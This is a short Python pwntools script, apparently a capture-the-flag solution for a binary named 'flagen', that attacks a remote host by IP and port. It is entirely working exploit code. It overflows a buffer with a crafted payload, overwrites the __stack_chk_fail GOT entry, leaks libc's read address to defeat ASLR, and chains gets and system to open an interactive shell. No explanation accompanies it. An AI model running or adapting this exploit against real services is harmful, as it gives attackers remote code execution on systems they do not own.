#!/usr/bin/python

from pwn import *
from pwnlib.log import *

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
elf = ELF("flagen")
lib = ELF("libc.so.6")

#r = remote("localhost", 55666)
r = remote("202.112.26.106", 5149)

r.recvuntil("choice: ")
r.sendline("1")



buf = p32(0x0804b510)
retins = p32(0x80485f8)
got = elf.got["__stack_chk_fail"]
puts = p32(elf.symbols["puts"])
read = p32(elf.symbols["read"])
pop1 = p32(0x8048481) 
payload = retins + "a"*8 + p32(elf.plt["printf"])
payload += "h"*84
ret = pop1
leave = p32(0x08048b2c)
readn = p32(0x080486cb)
payload += buf + ret + got + puts + pop1 + p32(elf.got["read"]) + readn + leave + p32(0x0804b514) + p32(0x20202020)

r.sendline(payload)
r.recvuntil("choice: ")
r.sendline("4")

leak = u32(r.recv(4))
info('leak = %x' % leak)
base = leak - lib.symbols["read"]
info('libc_base = %x' % base)
lib.address += base 

gets = p32(lib.symbols["gets"])
system = p32(lib.symbols["system"])
buf = p32(0x0804b600)
payload = gets + system + buf + buf
r.sendline(payload)

r.interactive()
